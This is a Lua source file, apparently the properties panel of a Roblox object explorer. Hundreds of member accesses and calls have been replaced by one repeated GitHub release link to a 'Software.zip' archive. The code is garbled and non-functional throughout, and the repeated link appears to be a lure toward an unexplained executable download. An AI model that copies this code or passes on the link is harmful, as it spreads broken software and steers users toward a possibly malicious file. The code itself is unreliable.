				local typeData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local typeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local attributeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local gName = propClass.."."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

				local checked = 0
				local subProps = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[typeName] or {}
				local subPropCount = #subProps
				local toCheck = subPropCount + 1
				local conflictsFound = 0
				local indexNames = {}
				local ignored = conflictIgnore[propClass] and conflictIgnore[propClass][propName]
				local truthyCheck = (typeName == "PhysicalProperties")
				local isAttribute = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local isMultiType = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

				t_clear(conflictMap)

				if not isMultiType then
					local firstVal,firstObj,firstSet
					local classList = classLists[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] or {}
					for c = 1,#classList do
						local obj = classList[c]
						if not firstSet then
							if isAttribute then
								firstVal = getAttribute(obj,attributeName)
								if firstVal ~= nil then
									firstObj = obj
									firstSet = true
								end
							else
								firstVal = obj[propName]
								firstObj = obj
								firstSet = true
							end
							if ignored then break end
						else
							local propVal,skip
							if isAttribute then
								propVal = getAttribute(obj,attributeName)
								if propVal == nil then skip = true end
							else
								propVal = obj[propName]
							end

							if not skip then
								if not conflictMap[1] then
									if truthyCheck then
										if (firstVal and true or false) ~= (propVal and true or false) then
											conflictMap[1] = true
											conflictsFound = conflictsFound + 1
										end
									elseif firstVal ~= propVal then
										conflictMap[1] = true
										conflictsFound = conflictsFound + 1
									end
								end

								if subPropCount > 0 then
									for sPropInd = 1,subPropCount do
										local indexes = indexNames[sPropInd]
										if not indexes then indexes = stringSplit(subProps[sPropInd],".") indexNames[sPropInd] = indexes end

										local firstValSub = firstVal
										local propValSub = propVal

										for j = 1,#indexes do
											if not firstValSub or not propValSub then break end -- PhysicalProperties
											local indexName = indexes[j]
											firstValSub = firstValSub[indexName]
											propValSub = propValSub[indexName]
										end

										local mapInd = sPropInd + 1
										if not conflictMap[mapInd] and firstValSub ~= propValSub then
											conflictMap[mapInd] = true
											conflictsFound = conflictsFound + 1
										end
									end
								end

								if conflictsFound == toCheck then break end
							end
						end

						checked = checked + 1
						if checked == maxConflictCheck then break end
					end

					if not conflictMap[1] then autoUpdateObjs[gName] = firstObj end
					for sPropInd = 1,subPropCount do
						if not conflictMap[sPropInd+1] then
							autoUpdateObjs[gName.."."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[sPropInd]] = firstObj
						end
					end
				end
			end
		end

		if p then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end
	end

	-- Fetches the properties to be displayed based on the explorer selection
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true -- im making it true anyway since its useful by default and people complain
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local maxConflictCheck = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local foundClasses = {}
		local propCount = 1
		local elevated = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local showDeprecated,showHidden = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local Classes = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local classLists = {}
		local lower = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local RMDCustomOrders = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local getAttributes = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local maxAttrs = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local showingAttrs = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local foundAttrs = {}
		local attrCount = 0
		local typeof = typeof
		local typeNameConvert = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(props)

		for i = 1,#sList do
			local node = sList[i]
			local obj = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local class = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if not class then class = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = class end

			local apiClass = Classes[class]
			while apiClass do
				local APIClassName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				if not foundClasses[APIClassName] then
					local apiProps = indexableProps[APIClassName]
					if not apiProps then apiProps = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(obj,apiClass) indexableProps[APIClassName] = apiProps end

					for i = 1,#apiProps do
						local prop = apiProps[i]
						local tags = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						if (not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or showDeprecated) and (not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or showHidden) then
							props[propCount] = prop
							propCount = propCount + 1
						end
					end
					foundClasses[APIClassName] = true
				end

				local classList = classLists[APIClassName]
				if not classList then classList = {} classLists[APIClassName] = classList end
				classList[#classList+1] = obj

				apiClass = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end

			if showingAttrs and attrCount < maxAttrs then
				local attrs = getAttributes(obj)
				for name,val in pairs(attrs) do
					local typ = typeof(val)
					if not foundAttrs[name] then
						local category = (typ == "Instance" and "Class") or (typ == "EnumItem" and "Enum") or "Other"
						local valType = {Name = typeNameConvert[typ] or typ, Category = category}
						local attrProp = {IsAttribute = true, Name = "ATTR_"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, AttributeName = name, DisplayName = name, Class = "Instance", ValueType = valType, Category = "Attributes", Tags = {}}
						props[propCount] = attrProp
						propCount = propCount + 1
						attrCount = attrCount + 1
						foundAttrs[name] = {typ,attrProp}
						if attrCount == maxAttrs then break end
					elseif foundAttrs[name][1] ~= typ then
						foundAttrs[name][2].MultiType = true
						foundAttrs[name][2]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
						foundAttrs[name][2].ValueType = {Name = "string"}
					end
				end
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(props,function(a,b)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				return (categoryOrder[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] or 9999) < (categoryOrder[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] or 9999)
			else
				local aOrder = (RMDCustomOrders[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] and RMDCustomOrders[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip][https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]) or 9999999
				local bOrder = (RMDCustomOrders[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] and RMDCustomOrders[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip][https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]) or 9999999
				if aOrder ~= bOrder then
					return aOrder < bOrder
				else
					return lower(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) < lower(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				end
			end
		end)

		-- Find conflicts and get auto-update instances
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = classLists
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		--warn("CONFLICT",tick()-start)
		if #props > 0 then
			props[#props+1] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local maxEntries = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip / 23)
		local maxX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local totalWidth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = maxEntries
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = #viewList + 1
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = maxX
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = totalWidth

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = #viewList + 1 > maxEntries
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 and totalWidth > maxX

		local oldSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and -16 or 0),1,(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and -39 or -23))
		if oldSize ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		else
			scrollV:Update()
			scrollH:Update()

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,-39)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,16)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,-23)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,16)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop,subName,valueType,displayName)
		local subProp = {}
		for i,v in pairs(prop) do
			subProp[i] = v
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = valueType
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or subName
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = displayName

		return subProp
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop) -- TODO: Optimize using table
		local result = {}
		local typeData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local typeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local makeSubProp = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		if typeName == "Vector2" then
			result[1] = makeSubProp(prop,".X",{Name = "float"})
			result[2] = makeSubProp(prop,".Y",{Name = "float"})
		elseif typeName == "Vector3" then
			result[1] = makeSubProp(prop,".X",{Name = "float"})
			result[2] = makeSubProp(prop,".Y",{Name = "float"})
			result[3] = makeSubProp(prop,".Z",{Name = "float"})
		elseif typeName == "CFrame" then
			result[1] = makeSubProp(prop,".Position",{Name = "Vector3"})
			result[2] = makeSubProp(prop,".RightVector",{Name = "Vector3"})
			result[3] = makeSubProp(prop,".UpVector",{Name = "Vector3"})
			result[4] = makeSubProp(prop,".LookVector",{Name = "Vector3"})
		elseif typeName == "UDim" then
			result[1] = makeSubProp(prop,".Scale",{Name = "float"})
			result[2] = makeSubProp(prop,".Offset",{Name = "int"})
		elseif typeName == "UDim2" then
			result[1] = makeSubProp(prop,".X",{Name = "UDim"})
			result[2] = makeSubProp(prop,".Y",{Name = "UDim"})
		elseif typeName == "Rect" then
			result[1] = makeSubProp(prop,".Min.X",{Name = "float"},"X0")
			result[2] = makeSubProp(prop,".Min.Y",{Name = "float"},"Y0")
			result[3] = makeSubProp(prop,".Max.X",{Name = "float"},"X1")
			result[4] = makeSubProp(prop,".Max.Y",{Name = "float"},"Y1")
		elseif typeName == "PhysicalProperties" then
			result[1] = makeSubProp(prop,".Density",{Name = "float"})
			result[2] = makeSubProp(prop,".Elasticity",{Name = "float"})
			result[3] = makeSubProp(prop,".ElasticityWeight",{Name = "float"})
			result[4] = makeSubProp(prop,".Friction",{Name = "float"})
			result[5] = makeSubProp(prop,".FrictionWeight",{Name = "float"})
		elseif typeName == "Ray" then
			result[1] = makeSubProp(prop,".Origin",{Name = "Vector3"})
			result[2] = makeSubProp(prop,".Direction",{Name = "Vector3"})
		elseif typeName == "NumberRange" then
			result[1] = makeSubProp(prop,".Min",{Name = "float"})
			result[2] = makeSubProp(prop,".Max",{Name = "float"})
		elseif typeName == "Faces" then
			result[1] = makeSubProp(prop,".Back",{Name = "bool"})
			result[2] = makeSubProp(prop,".Bottom",{Name = "bool"})
			result[3] = makeSubProp(prop,".Front",{Name = "bool"})
			result[4] = makeSubProp(prop,".Left",{Name = "bool"})
			result[5] = makeSubProp(prop,".Right",{Name = "bool"})
			result[6] = makeSubProp(prop,".Top",{Name = "bool"})
		elseif typeName == "Axes" then
			result[1] = makeSubProp(prop,".X",{Name = "bool"})
			result[2] = makeSubProp(prop,".Y",{Name = "bool"})
			result[3] = makeSubProp(prop,".Z",{Name = "bool"})
		end

		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "SoundId" and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Sound" then
			result[1] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		return result
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(viewList)

		local nameWidthCache = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local lastCategory
		local count = 1
		local maxWidth,maxDepth = 0,1

		local textServ = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local getTextSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local font = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,20)
		local stringSplit = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local entryIndent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local isFirstScaleType = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0
		local find,lower = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local searchText = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip > 0 and lower(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip))

		local function recur(props,depth)
			for i = 1,#props do
				local prop = props[i]
				local propName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local subName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local category = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

				local visible
				if searchText and depth == 1 then
					if find(lower(propName),searchText,1,true) then
						visible = true
					end
				else
					visible = true
				end

				if visible and lastCategory ~= category then
					viewList[count] = {CategoryName = category}
					count = count + 1
					lastCategory = category
				end

				if (expanded["CAT_"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] and visible) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					if depth > 1 then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = depth if depth > maxDepth then maxDepth = depth end end

					if isFirstScaleType then
						local nameArr = subName and stringSplit(subName,".")
						local displayName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or (nameArr and nameArr[#nameArr]) or propName

						local nameWidth = nameWidthCache[displayName]
						if not nameWidth then nameWidth = getTextSize(textServ,displayName,14,font,size).X nameWidthCache[displayName] = nameWidth end

						local totalWidth = nameWidth + entryIndent*depth
						if totalWidth > maxWidth then
							maxWidth = totalWidth
						end
					end

					viewList[count] = prop
					count = count + 1

					local fullName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "")
					if expanded[fullName] then
						local nextDepth = depth+1
						local expandedProps = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop)
						if #expandedProps > 0 then
							recur(expandedProps,nextDepth)
						end
					end
				end
			end
		end
		recur(props,1)

		inputProp = nil
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = maxWidth + 9 + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(index)
		local newEntry = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		local nameFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local valueFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local newCheckbox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,3)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = valueFrame
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			local prop = viewList[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not prop then return end

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "PhysicalProperties" then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and true or nil)
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			end
		end)
		checkboxes[index] = newCheckbox

		local iconFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,3)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,23*(index-1))

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			local prop = viewList[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not prop or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

			local fullName = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and "CAT_"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "")

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, expanded[fullName] and "Collapse_Over" or "Expand_Over")
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			local prop = viewList[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not prop or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

			local fullName = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and "CAT_"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "")

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, expanded[fullName] and "Collapse" or "Expand")
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			local prop = viewList[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not prop then return end

			local fullName = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and "CAT_"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "")
			if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[fullName] then return end

			expanded[fullName] = not expanded[fullName]
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			local prop = viewList[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not prop then return end
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				local fullNameFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip	
				local nameArr = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or ""),".")
				local dispName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or nameArr[#nameArr]
				local sizeX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(dispName,14,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,20)).X

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = dispName
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 1) + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,23*(index-1))
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,sizeX + 4,0,22)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = index
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(fullNameFrame, {Target = nameFrame})
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == index then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			local prop = viewList[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not prop then return end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,index)
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			local prop = viewList[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not prop then return end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,index,"color")
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			local prop = viewList[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not prop then return end

			local fullName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "")
			local inputFullName = inputProp and (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or ""))

			if fullName == inputFullName and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Class" then
				inputProp = nil
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,nil)
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,index,"right")
			end
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			local prop = viewList[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not prop then return end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop)
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(false)
			else
				local soundObj = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Sound")
				if soundObj then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(soundObj) end
			end
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

			local releaseEvent,mouseEvent
			releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
				releaseEvent:Disconnect()
				mouseEvent:Disconnect()
			end)

			local timeLine = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local soundObj = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Sound")
			if soundObj then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(soundObj,true) end

			local function update(input)
				local sound = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				if not sound or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 then return end

				local mouseX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local timeLineSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local relaX = mouseX - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

				if timeLineSize.X <= 1 then return end
				if relaX < 0 then relaX = 0 elseif relaX >= timeLineSize.X then relaX = timeLineSize.X-1 end

				local perc = (relaX/(timeLineSize.X-1))
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = perc*https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(perc,-4,0,-8)
			end
			update(input)

			mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					update(input)
				end
			end)
		end)

